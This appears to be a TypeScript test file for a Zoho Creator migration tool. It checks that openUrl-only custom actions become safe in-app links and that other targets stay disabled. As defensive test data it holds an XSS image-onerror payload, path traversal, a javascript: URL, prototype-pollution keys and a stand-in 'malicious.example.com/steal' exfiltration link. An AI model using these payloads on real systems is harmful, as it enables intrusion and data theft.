/**
 * A custom action whose workflow is only `openUrl` to this app's own form,
 * report or page is a client navigation: the button links to the target's
 * route (its access gate runs as for any visit) and a form link's query
 * prefills the target form from the clicked row. An external address, a
 * computed target, a report filter query, an unknown field or any other
 * statement keeps the action turned off and counted.
 */
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { JSDOM } from 'jsdom';
import { deriveIr, parse } from '../../core/src/index.js';
import { generate } from '../../deluge/src/index.js';
import { coverageLedger } from '../../quality/src/index.js';
import { buildUi } from '../src/index.js';
import type { UiModel } from '../src/index.js';

const tab = (n: number) => '\t'.repeat(n);

const action = (label: string, workflow: string, header = false) =>
  `${tab(3)}custom action "${label}"\n${tab(3)}(\n${tab(4)}workflow = ${workflow}\n${header ? `${tab(4)}show action in view header = true\n` : ''}${tab(3)})`;

const clickFn = (name: string, body: string, exec = 'for each record') =>
  `${tab(2)}${name} as "${name}"\n${tab(2)}{\n${tab(3)}type = functions\n${tab(3)}form = Item\n${tab(3)}execution type = ${exec}\n${tab(3)}on start\n${tab(3)}{\n${tab(4)}actions\n${tab(4)}{\n${tab(4)}on click\n${tab(4)}(\n${body
    .split('\n')
    .map((line) => `${tab(5)}${line}`)
    .join('\n')}\n${tab(4)})\n${tab(4)}}\n${tab(3)}}\n${tab(2)}}`;

const textField = (name: string) => `${tab(2)}${name}\n${tab(2)}(\n${tab(3)}type = text\n${tab(2)})`;

const NAV = {
  'Request It': ['Request_It', `openUrl("#Form:Request?Item_Ref=" + input.ID + "&zc_LoadIn=dialog","popup window","height=<height>,width=<width>");`, 'collection of records'],
  'Note It': ['Note_It', `openUrl("#Form:Request?Note=" + input.Name + "&Kind=Loan","same window");`],
  'New Request': ['New_Request', `openUrl("#Form:Request","popup window");`],
  'See Requests': ['See_Requests', `//Show the requests\nopenUrl("https://app.zohocreator.com" + zoho.appuri + "#Report:All_Requests","new window");`],
  'Go Home': ['Go_Home', `openUrl(zoho.appuri + "#Page:Home","same window");`],
  'Open Secret': ['Open_Secret', `openUrl("#Form:Secret?Item_Ref=" + input.ID,"popup window");`],
  'By Holder': ['By_Holder', `openUrl("#Form:Request?Item_Ref=" + input.Holder.ID,"popup window");`],
  'Holder Note': ['Holder_Note', `openUrl("#Form:Request?Item_Ref=" + input.Holder.Note,"popup window");`],
  'Page Detail': ['Page_Detail', `openUrl("#Page:Detail?param1=" + input.Name + "&param2=Fixed","same window");`],
  'Bill Page': ['Bill_Page', `openUrl("#Page:Detail?param1=" + input.ID,"same window");`],
  'Literal Attack': ['Literal_Attack', `openUrl("#Page:Detail?param1=<img src=x onerror=alert(1)>","same window");`],
} as const;

const COUNTED = {
  External: ['External_Link', `openUrl("https://example.com/items?id=" + input.ID,"new window");`],
  'Two Links': ['Two_Links', `openUrl("#Form:Request","popup window");\nopenUrl("#Report:All_Requests","same window");`],
  Computed: ['Computed_Link', `openUrl(input.Name,"same window");`],
  'Filtered Report': ['Filtered_Report', `openUrl("#Report:All_Requests?Note=" + input.Name,"same window");`],
  'Unknown Field': ['Unknown_Field', `openUrl("#Form:Request?Nope=" + input.ID,"popup window");`],
  'Unknown Read': ['Unknown_Read', `openUrl("#Form:Request?Note=" + input.Missing,"popup window");`],
  'Unknown Form': ['Unknown_Form', `openUrl("#Form:Nowhere","popup window");`],
  'Deep Read': ['Deep_Read', `openUrl("#Form:Request?Item_Ref=" + input.Name.ID,"popup window");`],
  'Deep Lookup': ['Deep_Lookup', `openUrl("#Form:Request?Item_Ref=" + input.Holder.Note.Extra,"popup window");`],
  'Missing Leaf': ['Missing_Leaf', `openUrl("#Form:Request?Item_Ref=" + input.Holder.Nope,"popup window");`],
  'Head Not Lookup': ['Head_Not_Lookup', `openUrl("#Form:Request?Item_Ref=" + input.Name.Note,"popup window");`],
  'Foreign Host': ['Foreign_Host', `openUrl("https://elsewhere.example" + zoho.appuri + "#Form:Request","popup window");`],
  'Undeclared Param': ['Undeclared_Param', `openUrl("#Page:Detail?nope=" + input.Name,"same window");`],
  'Undeclared Nested': ['Undeclared_Nested', `openUrl("#Page:Detail?nope=" + input.Holder.Note,"same window");`],
  'Case Mismatch': ['Case_Mismatch', `openUrl("#Page:Detail?PARAM1=" + input.Name,"same window");`],
  'Missing Page Params': ['Missing_Page_Params', `openUrl("#Page:Nowhere?param1=" + input.Name,"same window");`],
} as const;

// A body with any other statement is no navigation; this one generates a
// function, so it dispatches through the registry as before.
const MIXED = { Mixed: ['Mixed_Body', `info "Opening";\nopenUrl("#Form:Request","popup window");`] } as const;

const ALL = { ...NAV, ...COUNTED, ...MIXED } as Record<string, readonly string[]>;

function source(): string {
  const page = JSON.stringify("<zml><layout><row><column width='100%'><text value='Welcome'></text></column></row></layout></zml>");
  return `application "Lending"
{
${tab(1)}form Item
${tab(1)}{
${textField('Name')}
${textField('Status')}
${tab(2)}Holder
${tab(2)}(
${tab(3)}type = picklist
${tab(3)}values = Request.ID
${tab(3)}displayformat = [Note]
${tab(2)})
${tab(1)}}
${tab(1)}form Request
${tab(1)}{
${textField('Item_Ref')}
${textField('Note')}
${textField('Kind')}
${tab(1)}}
${tab(1)}form Secret
${tab(1)}{
${textField('Item_Ref')}
${tab(1)}}
${tab(1)}list All_Items
${tab(1)}{
${tab(2)}show all rows from Item
${tab(2)}(
${tab(3)}Name
${tab(3)}Status
${Object.entries(ALL)
  .map(([label, [workflow]]) => action(label, workflow!, label === 'See Requests' || label === 'Request It'))
  .join('\n')}
${tab(2)})
${tab(1)}}
${tab(1)}list All_Requests
${tab(1)}{
${tab(2)}show all rows from Request
${tab(2)}(
${tab(3)}Note
${tab(2)})
${tab(1)}}
${tab(1)}page Home
${tab(1)}{
${tab(2)}Content=${page}
${tab(1)}}
${tab(1)}page Detail(param1, param2)
${tab(1)}{
${tab(2)}Content=${page}
${tab(1)}}
${tab(1)}workflow
${tab(1)}{
${tab(1)}functions
${tab(1)}{
${Object.values(ALL)
  .map(([workflow, body, exec]) => clickFn(workflow!, body!, exec))
  .join('\n')}
${tab(1)}}
${tab(1)}}
}
`;
}

function built() {
  return buildUi(deriveIr(parse(source())));
}

function report(model: UiModel) {
  return model.reports.find((item) => item.name === 'All_Items')!;
}

interface Runtime {
  renderReport(report: unknown): string;
  renderReportRows(report: unknown, rows: unknown[]): string;
  cardActions(report: unknown, id: string, row?: unknown): { href?: string; action?: string; label: string }[];
  parseRoute(hash: string): Record<string, unknown>;
  boot(model: UiModel, doc: unknown): Promise<void>;
}

async function runtime(): Promise<Runtime> {
  (globalThis as { CSS?: unknown }).CSS ??= { escape: (value: string) => value };
  const { clientRuntimeSource } = await import('../src/generate.js');
  return (await import(`data:text/javascript;base64,${Buffer.from(clientRuntimeSource()).toString('base64')}`)) as unknown as Runtime;
}

const flush = async (n = 30) => {
  for (let i = 0; i < n; i++) await new Promise((resolve) => setTimeout(resolve, 0));
};

test('an openUrl-only workflow to an own form, report or page is a navigation; anything else stays a counted todo', () => {
  const { model, files } = built();
  const byName = new Map(report(model).customActions.map((item) => [item.name, item]));
  assert.deepEqual(byName.get('Request It')?.navigate, { kind: 'form', target: 'Request', href: '#/form/Request', params: [{ name: 'Item_Ref', field: 'ROWID' }] });
  assert.deepEqual(byName.get('Note It')?.navigate, {
    kind: 'form',
    target: 'Request',
    href: '#/form/Request',
    params: [
      { name: 'Note', field: 'Name' },
      { name: 'Kind', value: 'Loan' },
    ],
  });
  assert.deepEqual(byName.get('New Request')?.navigate, { kind: 'form', target: 'Request', href: '#/form/Request', params: [] });
  assert.deepEqual(byName.get('See Requests')?.navigate, { kind: 'report', target: 'All_Requests', href: '#/report/All_Requests', params: [] });
  assert.deepEqual(byName.get('By Holder')?.navigate, { kind: 'form', target: 'Request', href: '#/form/Request', params: [{ name: 'Item_Ref', field: 'Holder' }] });
  assert.deepEqual(byName.get('Holder Note')?.navigate, { kind: 'form', target: 'Request', href: '#/form/Request', params: [{ name: 'Item_Ref', field: 'Holder.Note' }] });
  assert.deepEqual(byName.get('Go Home')?.navigate, { kind: 'page', target: 'Home', href: '#/page/Home', params: [] });
  assert.deepEqual(byName.get('Page Detail')?.navigate, {
    kind: 'page',
    target: 'Detail',
    href: '#/page/Detail',
    params: [
      { name: 'param1', field: 'Name' },
      { name: 'param2', value: 'Fixed' },
    ],
  });
  assert.deepEqual(byName.get('Bill Page')?.navigate, { kind: 'page', target: 'Detail', href: '#/page/Detail', params: [{ name: 'param1', field: 'ROWID' }] });
  assert.deepEqual(byName.get('Literal Attack')?.navigate, {
    kind: 'page',
    target: 'Detail',
    href: '#/page/Detail',
    params: [{ name: 'param1', value: '<img src=x onerror=alert(1)>' }],
  });
  for (const name of Object.keys(NAV)) assert.equal(byName.get(name)?.preview, undefined, `${name} is enabled`);
  for (const name of Object.keys(COUNTED)) {
    assert.equal(byName.get(name)?.preview, true, `${name} stays turned off`);
    assert.equal(byName.get(name)?.navigate, undefined, `${name} is no navigation`);
  }
  assert.equal(byName.get('Mixed')?.navigate, undefined, 'a mixed body is no navigation');
  assert.equal(byName.get('Mixed')?.preview, undefined, 'a mixed body that generated a function still dispatches');
  assert.ok(files.some((file) => file.path === 'functions/custom/mixed-body.mjs'));
  const actionTodos = model.todos.filter((todo) => todo.area === 'report' && /^Custom action /.test(todo.reason)).map((todo) => todo.reason);
  assert.deepEqual(actionTodos, Object.keys(COUNTED).map((name) => `Custom action "${name}" is not migrated; its button is turned off.`));
  assert.ok(model.todos.filter((todo) => todo.area === 'report' && /^Custom action /.test(todo.reason)).every((todo) => todo.manualReasons?.includes('untranslated')));
  const migration = files.find((file) => file.path.endsWith('migration-report.json'));
  assert.equal((JSON.parse(String(migration?.data)) as { uiTodoCount: number }).uiTodoCount, model.todos.length);
});

test('a navigation needs the workflow on the report form with a record execution type', () => {
  const text = source().replace(`${tab(3)}form = Item\n${tab(3)}execution type = for each record\n${tab(3)}on start\n${tab(3)}{\n${tab(4)}actions\n${tab(4)}{\n${tab(4)}on click\n${tab(4)}(\n${tab(5)}openUrl("#Form:Request?Note="`, `${tab(3)}form = Request\n${tab(3)}execution type = for each record\n${tab(3)}on start\n${tab(3)}{\n${tab(4)}actions\n${tab(4)}{\n${tab(4)}on click\n${tab(4)}(\n${tab(5)}openUrl("#Form:Request?Note="`);
  assert.notEqual(text, source(), 'the fixture moved Note_It to another form');
  const { model } = buildUi(deriveIr(parse(text)));
  const noteIt = report(model).customActions.find((item) => item.name === 'Note It');
  assert.equal(noteIt?.navigate, undefined);
  assert.equal(noteIt?.preview, true);
});

test('the static client links each navigation with values only from the row it read', async () => {
  const rt = await runtime();
  const ui = report(built().model);
  const rows = rt.renderReportRows(ui, [{ ROWID: '7', Name: 'Desk & chair', Status: 'In', Holder: '42' }, { ROWID: '8', Status: 'Out' }]);
  const dom = new JSDOM(`<table><tbody>${rows}</tbody></table>`);
  const [first, second] = [...(dom.window.document as unknown as Document).querySelectorAll('tr[data-card]')];
  const links = (tr: Element) => [...tr.querySelectorAll('td[data-row-ops] a[data-action-nav]')].map((a) => `${a.textContent} ${a.getAttribute('href')}`);
  assert.deepEqual(links(first!), [
    'Request It #/form/Request?Item_Ref=7',
    'Note It #/form/Request?Note=Desk%20%26%20chair&Kind=Loan',
    'New Request #/form/Request',
    'Go Home #/page/Home',
    'Open Secret #/form/Secret?Item_Ref=7',
    'By Holder #/form/Request?Item_Ref=42',
    'Holder Note #/form/Request',
    'Page Detail #/page/Detail?param1=Desk%20%26%20chair&param2=Fixed',
    'Bill Page #/page/Detail?param1=7',
    'Literal Attack #/page/Detail?param1=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
  ]);
  // Row 8's Name is not on the row (the caller cannot read it): no Note prefill.
  assert.deepEqual(links(second!), [
    'Request It #/form/Request?Item_Ref=8',
    'Note It #/form/Request?Kind=Loan',
    'New Request #/form/Request',
    'Go Home #/page/Home',
    'Open Secret #/form/Secret?Item_Ref=8',
    'By Holder #/form/Request',
    'Holder Note #/form/Request',
    'Page Detail #/page/Detail?param2=Fixed',
    'Bill Page #/page/Detail?param1=8',
    'Literal Attack #/page/Detail?param1=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
  ]);
  // Counted actions draw no link.
  assert.doesNotMatch(rows, /External|Mixed|Computed|Filtered Report|Undeclared Param|Undeclared Nested|Case Mismatch|Missing Page|Deep Lookup|Missing Leaf|Head Not Lookup/);
  // The phone card carries the same links.
  const card = rt.cardActions(ui, '7', { ROWID: '7', Name: 'Desk' }).filter((item) => item.href && !item.href.startsWith('#/report/All_Items'));
  assert.equal(card.find((item) => item.label === 'Note It')?.href, '#/form/Request?Note=Desk&Kind=Loan');
  // A header navigation that needs no row sits in the toolbar as a link; one
  // that prefills from a row does not.
  const shell = new JSDOM(rt.renderReport(ui)).window.document as unknown as Document;
  const toolbar = [...shell.querySelectorAll('[data-report-tools] a[data-action-nav]')].map((a) => `${a.textContent} ${a.getAttribute('href')}`);
  assert.deepEqual(toolbar, ['See Requests #/report/All_Requests']);
  assert.equal(shell.querySelector('[data-report-tools] [data-action]')?.textContent, undefined, 'no row-bound action in the toolbar');
});

test('a one-level lookup read prefills from the row dotted key, and nothing when the caller could not read it', async () => {
  const rt = (await runtime()) as Runtime & { actionNavHref(nav: unknown, row: unknown): string };
  const { model } = built();
  const nav = report(model).customActions.find((item) => item.name === 'Holder Note')?.navigate!;
  assert.ok(nav, 'a one-level lookup read migrates');
  assert.deepEqual(nav.params, [{ name: 'Item_Ref', field: 'Holder.Note' }]);
  const href = (row: unknown) => rt.actionNavHref(nav, row);
  // The dotted key the server attached under the caller scope prefills.
  assert.equal(href({ ROWID: '7', 'Holder.Note': 'First note' }), '#/form/Request?Item_Ref=First%20note');
  // A nested object cell (a supplied row) resolves the same path.
  assert.equal(href({ ROWID: '7', Holder: { Note: 'Nested' } }), '#/form/Request?Item_Ref=Nested');
  // No key on the row (the caller cannot read the lookup or its field):
  // the param is left out, never leaked.
  assert.equal(href({ ROWID: '7', Holder: '42' }), '#/form/Request');
  assert.equal(href({ ROWID: '7' }), '#/form/Request');
  // A non-scalar cell never travels.
  assert.equal(href({ ROWID: '7', 'Holder.Note': { text: 'x' } }), '#/form/Request');
  assert.equal(href({ ROWID: '7', 'Holder.Note': ['a'] }), '#/form/Request');
  // A hostile related value stays a literal data value: encoded in the query,
  // never in the path, and decoding returns the exact input.
  const hostile = href({ ROWID: '7', 'Holder.Note': '<img src=x onerror=alert(1)>../' });
  assert.ok(hostile.startsWith('#/form/Request?'), hostile);
  assert.doesNotMatch(hostile, /[<>"]/);
  assert.ok(!hostile.includes('../'), 'no path traversal in the link');
  const query = Object.fromEntries(new URLSearchParams(hostile.split('?')[1]).entries());
  assert.equal(query.Item_Ref, '<img src=x onerror=alert(1)>../');
});

test('a prefilled form route fills only the target form fields, and an edit route never prefills', async () => {
  const rt = await runtime();
  assert.deepEqual(rt.parseRoute('#/form/Request?Item_Ref=7&Note=a%20b'), { name: 'form', id: 'Request', edit: undefined, prefill: { Item_Ref: '7', Note: 'a b' } });
  assert.deepEqual(rt.parseRoute('#/form/Request'), { name: 'form', id: 'Request', edit: undefined });
  assert.deepEqual(rt.parseRoute('#/form/Request/edit/5?Note=x'), { name: 'form', id: 'Request', edit: '5' });
  const { model } = built();
  const dom = new JSDOM('<!doctype html><body><main id="main"></main></body>', { url: 'http://localhost/app/index.html#/form/Request?Item_Ref=7&Note=Desk&Bogus=1' });
  (dom.window as unknown as { fetch: unknown }).fetch = async () => ({ ok: true, status: 200, json: async () => ({ dryRun: true }), text: async () => '{}' });
  await rt.boot(model, dom.window.document);
  await flush();
  const value = (name: string) => (dom.window.document.querySelector(`[name="${name}"]`) as HTMLInputElement | null)?.value;
  assert.equal(value('Item_Ref'), '7');
  assert.equal(value('Note'), 'Desk');
  assert.equal(value('Kind'), '');
  assert.equal(dom.window.document.querySelector('[name="Bogus"]'), null);
});

test('a page navigation carries only declared params, applied as encoded data values', async () => {
  const rt = (await runtime()) as Runtime & {
    actionNavHref(nav: unknown, row: unknown): string;
    snippetPageInput(doc: unknown): Record<string, string>;
    hydrateSnippets(root: unknown, model: unknown, view: unknown): void;
  };
  const { model } = built();
  const nav = report(model).customActions.find((item) => item.name === 'Page Detail')?.navigate!;
  assert.ok(nav, 'a page action with declared params migrates');
  // A hostile row value stays a literal data value: encoded in the query,
  // never in the path, and decoding returns the exact input.
  const href = rt.actionNavHref(nav, { ROWID: '7', Name: '<img src=x onerror=alert(1)>../' });
  assert.ok(href.startsWith('#/page/Detail?'), href);
  assert.doesNotMatch(href, /[<>"]/);
  assert.ok(!href.includes('../'), 'no path traversal in the link');
  const query = Object.fromEntries(new URLSearchParams(href.split('?')[1]).entries());
  assert.equal(query.param1, '<img src=x onerror=alert(1)>../');
  assert.equal(query.param2, 'Fixed');
  // The page route reads the query back as data values only.
  // snippetPageInput returns a null-prototype object by design; spreading
  // copies its exact entries into a plain object so deepEqual checks the same
  // keys and values without tripping on the prototype.
  assert.deepEqual({ ...rt.snippetPageInput({ location: { hash: '#/page/Detail?param1=a%20b&param2=%3Cimg%3E' } }) }, {
    param1: 'a b',
    param2: '<img>',
  });
  // Prototype-shaping names never become input keys.
  assert.deepEqual({ ...rt.snippetPageInput({ location: { hash: '#/page/Detail?__proto__=x&constructor=y&param1=z' } }) }, { param1: 'z' });
});

test('the page receives declared params as its snippet render input', async () => {
  const rt = (await runtime()) as Runtime & {
    snippetPageInput(doc: unknown): Record<string, string>;
    hydrateSnippets(root: unknown, model: unknown, view: unknown): void;
  };
  const { model } = built();
  const posted: { url: string; input: unknown }[] = [];
  const dom = new JSDOM('<div><div data-snippet-src="/htmlpages/Detail/s0">shell</div></div>', {
    url: 'http://localhost/app/index.html#/page/Detail?param1=Desk&param2=<b>',
  });
  const root = dom.window.document.querySelector('div')!;
  rt.hydrateSnippets(root, model, {
    fetch: async (url: string, init: { body: string }) => {
      posted.push({ url, input: (JSON.parse(init.body) as { input: unknown }).input });
      return { ok: true, status: 200, json: async () => ({ html: '<p>ok</p>' }), text: async () => '{}' };
    },
    location: (dom.window as unknown as { location: unknown }).location,
  });
  await flush();
  assert.equal(posted.length, 1);
  assert.equal(posted[0]!.url, '/htmlpages/Detail/s0');
  assert.deepEqual(posted[0]!.input, { param1: 'Desk', param2: '<b>' });
});

test('a navigation to a screen the caller cannot open is refused by that screen gate', async () => {
  const rt = await runtime();
  const { model } = built();
  const href = report(model).customActions.find((item) => item.name === 'Open Secret')?.navigate?.href;
  assert.equal(href, '#/form/Secret');
  // Secret is listed only in a hidden section: its route asks the server first.
  model.nav = [...model.nav.map((section) => ({ ...section, items: section.items.filter((item) => item.name !== 'Secret') })), { name: 'Back office', hidden: true, items: [{ kind: 'form', name: 'Secret', label: 'Secret', href: '#/form/Secret' }] }] as UiModel['nav'];
  const calls: string[] = [];
  const dom = new JSDOM('<!doctype html><body><main id="main"></main></body>', { url: `http://localhost/app/index.html${href}?Item_Ref=7` });
  (dom.window as unknown as { fetch: unknown }).fetch = async (url: string) => {
    calls.push(url);
    return { ok: false, status: 403, json: async () => ({}), text: async () => '{}' };
  };
  await rt.boot(model, dom.window.document);
  await flush();
  const main = dom.window.document.querySelector('main') as unknown as HTMLElement;
  assert.equal(main.querySelector('[data-access-status]')?.getAttribute('data-access-status'), '403', main.innerHTML);
  assert.equal(main.querySelector('form'), null, 'the gated form is not drawn');
  assert.ok(calls.length > 0, 'the gate asked the server');
});

test('a custom action workflow delegating to an openUrl function navigates to the target form with mapped parameters', async () => {
  const ds = `application "DelegatedNav"
{
  form Task
  {
    Task_Title ( type = text )
  }
  form Add_Attachment
  {
    Task_Name ( type = text )
  }
  list All_Tasks
  {
    show all rows from Task
    (
      Task_Title
      custom action "Add Comment"
      (
        workflow = Add_Comments1
        show action in view header = true
      )
    )
  }
  functions
  {
    void customActions.addComment(int taskRecID)
    {
      openUrl("#Form:Add_Attachment?Task_Name=" + taskRecID, "popup window");
    }
  }
  workflow
  {
    functions
    {
      Add_Comments1 as "Add Comments"
      {
        type = functions
        form = Task
        execution type = for each record
        on start
        {
          actions
          {
            thisapp.customActions.addComment(ID);
          }
        }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const { model } = buildUi(app);
  const gen = generate(app);
  assert.ok(gen.files.some((f) => f.path === 'functions/custom/customactions-addcomment.mjs'), 'customActions.addComment module emitted');
  assert.ok(gen.files.some((f) => f.path === 'functions/custom/add-comments1.mjs'), 'Add_Comments1 module emitted');

  const rows = coverageLedger(app);
  const fnRow = rows.find((r) => r.kind === 'function' && r.name === 'customActions.addComment');
  assert.equal(fnRow?.status, 'emitted', 'customActions.addComment is not dropped');

  const rep = model.reports.find((r) => r.name === 'All_Tasks');
  const act = rep?.customActions.find((a) => a.name === 'Add Comment');
  assert.equal(act?.preview, undefined, 'Add Comment is enabled');
  assert.deepEqual(act?.navigate, {
    kind: 'form',
    target: 'Add_Attachment',
    href: '#/form/Add_Attachment',
    params: [{ name: 'Task_Name', field: 'ROWID' }],
  });

  // Verify DOM rendering
  const rt = await runtime();
  const rendered = rt.renderReportRows(rep, [{ ROWID: '42', Task_Title: 'Fix bug' }]);
  assert.ok(rendered.includes('#/form/Add_Attachment?Task_Name=42'), 'action link has prefilled ROWID');
  assert.ok(rendered.includes('data-action-nav=""'), 'action link has data-action-nav');
});

test('unsupported openUrl targets in custom functions become counted todos, not silent drops or launderings', () => {
  const ds = `application "UnsupportedTargets"
{
  form Task
  {
    Task_Title ( type = text )
  }
  list All_Tasks
  {
    show all rows from Task
    (
      Task_Title
      custom action "External" ( workflow = Open_External )
      custom action "Bad Script" ( workflow = Open_Script )
      custom action "Missing Form" ( workflow = Open_Missing )
    )
  }
  functions
  {
    void customActions.externalLink(int id)
    {
      openUrl("https://malicious.example.com/steal?id=" + id, "popup window");
    }
    void customActions.scriptLink(int id)
    {
      openUrl("javascript:alert(1)", "popup window");
    }
    void customActions.missingForm(int id)
    {
      openUrl("#Form:NoSuchForm?id=" + id, "popup window");
    }
  }
  workflow
  {
    functions
    {
      Open_External as "Open External"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { thisapp.customActions.externalLink(ID); } }
      }
      Open_Script as "Open Script"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { thisapp.customActions.scriptLink(ID); } }
      }
      Open_Missing as "Open Missing"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { thisapp.customActions.missingForm(ID); } }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const gen = generate(app);
  const unsupportedTodos = gen.todos.filter((t) => t.construct === 'openurl-unsupported-target');
  assert.equal(unsupportedTodos.length, 3, 'all 3 unsupported openUrl functions generate counted todos');

  const rows = coverageLedger(app);
  for (const fnName of ['customActions.externalLink', 'customActions.scriptLink', 'customActions.missingForm']) {
    const row = rows.find((r) => r.kind === 'function' && r.name === fnName);
    assert.equal(row?.status, 'counted', `${fnName} is counted, never silently dropped`);
    assert.equal(row?.via, 'todo');
  }

  const { model } = buildUi(app);
  const rep = model.reports.find((r) => r.name === 'All_Tasks');
  for (const name of ['External', 'Bad Script', 'Missing Form']) {
    const act = rep?.customActions.find((a) => a.name === name);
    assert.equal(act?.preview, true, `${name} button is turned off`);
    assert.equal(act?.navigate, undefined, `${name} has no client navigation`);
  }
});

test('mutation test: breaking parameter delegation or target validation breaks client navigation', () => {
  const ds = `application "MutationApp"
{
  form Item
  {
    Title ( type = text )
  }
  form Target
  {
    Ref_ID ( type = text )
  }
  list Items
  {
    show all rows from Item
    (
      Title
      custom action "Go" ( workflow = Nav_Action )
    )
  }
  functions
  {
    void customActions.target(int itemId)
    {
      openUrl("#Form:Target?Ref_ID=" + itemId, "popup window");
    }
  }
  workflow
  {
    functions
    {
      Nav_Action as "Nav Action"
      {
        type = functions
        form = Item
        execution type = for each record
        on start { actions { thisapp.customActions.target(ID); } }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const { model } = buildUi(app);
  const act = model.reports[0]!.customActions[0]!;
  assert.equal(act.preview, undefined);
  assert.deepEqual(act.navigate, {
    kind: 'form',
    target: 'Target',
    href: '#/form/Target',
    params: [{ name: 'Ref_ID', field: 'ROWID' }],
  });

  // Mutate: if target form field does not match ('Ref_ID' vs 'Wrong_Field'), navigation is refused
  const mutatedDs = ds.replace('Ref_ID=', 'Wrong_Field=');
  const mutatedApp = deriveIr(parse(mutatedDs));
  const mutatedUi = buildUi(mutatedApp);
  const mutatedAction = mutatedUi.model.reports[0]!.customActions[0]!;
  assert.equal(mutatedAction.preview, true, 'mutated unknown field turns action off');
  assert.equal(mutatedAction.navigate, undefined, 'mutated unknown field produces no navigation');
});
